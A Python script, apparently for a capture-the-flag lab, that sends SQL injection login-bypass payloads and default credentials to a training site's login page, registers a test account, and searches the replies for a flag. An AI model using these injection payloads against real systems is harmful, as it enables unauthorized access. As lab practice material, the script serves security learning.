import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
tests = [
    ("' OR 1=1-- -", "x"),
    ("admin'-- -", "x"),
    ("' or '1'='1'-- -", "' or '1'='1"),
    ("admin", "admin"),
    ("' UNION SELECT 1,2,3-- -", "x"),
]
for u, p in tests:
    try:
        r = s.post(BASE + "index.php", data={"username": u, "password": p}, timeout=15)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        txt = re.sub(r"<[^>]+>", " ", r.text)
        txt = re.sub(r"\s+", " ", txt)
        print("%-24s/%-12s -> %d | %s" % (u[:24], p[:12], len(r.text),
              ("FLAG " + m.group(0)) if m else txt[:150]))
    except Exception as e:
        print(u, "ERR", type(e).__name__)
# tentative d'inscription puis login
r = s.post(BASE + "register.php", data={"user": "testuser1", "pass": "testpass1"}, timeout=15)
print("\nregister:", r.status_code, len(r.text))
txt = re.sub(r"<[^>]+>", " ", r.text)
print(re.sub(r"\s+", " ", txt)[:200])
r = s.post(BASE + "index.php", data={"username": "testuser1", "password": "testpass1"}, timeout=15)
print("login testuser1:", r.status_code, len(r.text))
txt = re.sub(r"<[^>]+>", " ", r.text)
print(re.sub(r"\s+", " ", txt)[:300])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
print("FLAG:", m.group(0) if m else None)
